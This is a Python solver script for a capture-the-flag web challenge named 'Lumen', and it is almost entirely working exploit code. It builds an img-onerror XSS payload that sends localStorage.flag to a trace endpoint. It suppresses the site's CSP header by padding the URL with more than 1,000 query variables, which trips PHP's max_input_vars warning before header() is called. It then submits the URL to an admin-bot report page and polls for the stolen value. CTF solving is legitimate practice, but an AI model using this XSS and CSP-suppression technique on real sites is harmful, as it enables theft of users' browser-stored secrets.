#!/usr/bin/env python3
"""Solve the Lumen challenge by suppressing its CSP response header."""

from __future__ import annotations

import argparse
import html
import json
import re
import secrets
import sys
import time
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen


FLAG_RE = re.compile(r"BHFlagY\{[^}\r\n]+\}")
CHALLENGE_DIR = Path(__file__).resolve().parent


def default_base_url() -> str:
    instance = json.loads(
        (CHALLENGE_DIR / "instance.json").read_text(encoding="utf-8")
    )
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")
    return str(endpoint["url"]).rstrip("/")


def delayed_decode(value: str) -> str:
    """Keep syntax inert until the application's explicit urldecode()."""
    return (
        value.replace("%", "%25")
        .replace("+", "%2b")
        .replace("&", "%26")
        .replace('"', "%22")
        .replace("'", "%27")
        .replace(">", "%3e")
    )


def make_payload_url(base_url: str, trace_id: str) -> str:
    javascript = (
        f"location='/?p=trace\\x26id={trace_id}\\x26note='+"
        "encodeURIComponent(localStorage.flag)"
    )
    tag = f'img src=x onerror="{javascript}">'
    query = urlencode(
        {
            "p": "view",
            "dir": "%3",
            "file": "c" + delayed_decode(tag),
        }
    )

    # p/dir/file are parsed first. Repeated short variables then exceed
    # max_input_vars=1000, emitting a startup warning before index.php calls
    # header(). With output_buffering=0, the CSP header can no longer be sent.
    return f"{base_url}/?{query}" + "&x" * 1001


def request_text(url: str, *, data: bytes | None = None, timeout: float = 10) -> str:
    request = Request(url, data=data, headers={"User-Agent": "lumen-solver/1.0"})
    try:
        with urlopen(request, timeout=timeout) as response:
            return response.read().decode("utf-8", "replace")
    except HTTPError as exc:
        return exc.read().decode("utf-8", "replace")


def solve(base_url: str, poll_seconds: float) -> str:
    trace_id = "LUMEN" + secrets.token_hex(6).upper()
    payload_url = make_payload_url(base_url, trace_id)
    post_body = urlencode({"url": payload_url}).encode()
    report = request_text(f"{base_url}/?p=report", data=post_body)
    if "Queued." not in report:
        raise RuntimeError("the report endpoint did not accept the payload URL")

    deadline = time.monotonic() + poll_seconds
    trace_url = f"{base_url}/?" + urlencode({"p": "trace", "id": trace_id})
    while time.monotonic() < deadline:
        trace = html.unescape(request_text(trace_url))
        match = FLAG_RE.search(trace)
        if match:
            return match.group(0)
        time.sleep(0.4)
    raise TimeoutError(f"operator did not deliver a flag to trace {trace_id}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=None, help="challenge base URL (defaults to instance.json)")
    parser.add_argument("--timeout", type=float, default=15, help="bot polling timeout in seconds")
    args = parser.parse_args()
    base_url = (args.url or default_base_url()).rstrip("/")

    try:
        flag = solve(base_url, args.timeout)
    except (OSError, URLError, RuntimeError, TimeoutError, ValueError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    sys.stdout.buffer.write(flag.encode("ascii"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
